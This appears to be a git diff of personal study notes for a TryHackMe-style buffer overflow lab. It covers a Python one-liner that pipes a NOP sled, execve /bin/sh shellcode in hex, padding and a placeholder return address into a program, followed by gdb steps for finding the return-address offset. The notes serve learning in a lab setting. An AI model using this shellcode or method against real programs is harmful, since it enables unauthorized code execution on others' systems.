@@ -494,8 +494,46 @@ int main(int argc, char **argv)
 	- Shellcode, Memory Addresses and NOP Sleds are usually in hex code
 	- To make it easy to pass the payload to an input program, you can use python:
 	- `python -c "print (NOP * no_of_nops + shellcode + random_data * no_of_random_data + memory_address)"`
-	- In this particular module/challenge:
+	- In this particular module/challenge *something* like:
 	`python -c "print('\90' * 30 + '\x48\xb9\x2f\x62\x69\x6e\x2f\x73\x68\x11\x48\xc1\xe1\x08\x48\xc1\xe9\x08\x51\x48\x8d\x3c\x24\x48\x31\xd2\xb0\x3b\x0f\x05' + '\x41' * 60 + '\xef\xbe\xad\xde') | ./program-name"
 	- lol `deadbeef` ^ 
 	- There can be cases where you need to pass xargs before the ./prrogram-name
-	- oof.
+- oof. After a while I had to look up some additional information because my knowledge-set with debugging and with C is very limited at this stage (if even existent!)
+	- https://l1ge.github.io/tryhackme_bof1/ **(thanks bud!!!!!!! - real good writeup, great for learning - check this out, for sure.)**
+		- The use of `gdb` is real
+			- `gdb program-name`
+			- Finding out how many characters/bytes the program can handle (for the context of this particular module/scenario - also a handy command to know - pretty much the first time I also am using gdb - like the writeup above)
+			- `(gdb) run $(python -c "print('A'*140)")`
+				- See the outcomes you get, what can be accepted or is 'normal' and what isn't
+				- The tactic here is to find out where the base-point `rbp` is and also where the return address starts and finishes. Also how big these addresses are (how many bytes in size - again the writeup covers this so I won't rewrite what is written, read it up, real good)
+			-  -----------
+			- *144 characters
+			- ***Inferior 1 (process 13411) exited normally***
+			- -----------
+			- *145 characters*
+			- ***0x0000000000000000 in ?? ()****
+			- -----------
+			- *This started with **146 to 151** characters*
+			- ***0x0000000000400595 in main ()***
+			- *Is this rbp?*
+			- -----------
+			- *152 characters*
+			- ***0x0000000000400500 in do_global_dtors_aux ()***
+			- *This can be considered the START of the RETURN ADDRESS*
+			-  -----------
+			- *153 characters*
+			- ***0x0000000000400041 in ?? ()***
+			- -----------
+			- *158*
+			- ***0x0000414141414141 in ?? ()***
+			- *6-bytes*
+			- *END of the RETURN ADDRESS*
+			- -----------
+			- ***159***
+			- ***0x0000000000400563 in copy_arg ()***
+			- -----------
+			- See the patterns being created there, we know (since we have access to the source code in this instance - which won't be the case otherwise...) that the buffer goes from 0-140. 
+				- Seems like there are six-bytes that are kept for the return address, which starts to get the overflow of the character "A" (x/41) from 152/153 onwards to 158 characters being input to the program
+- Metasploit can be used as well to generate a random length pattern to confirm if the return address we identified above is accurate or not
+- `(gdb) i r`
+	- To view the registers :) 
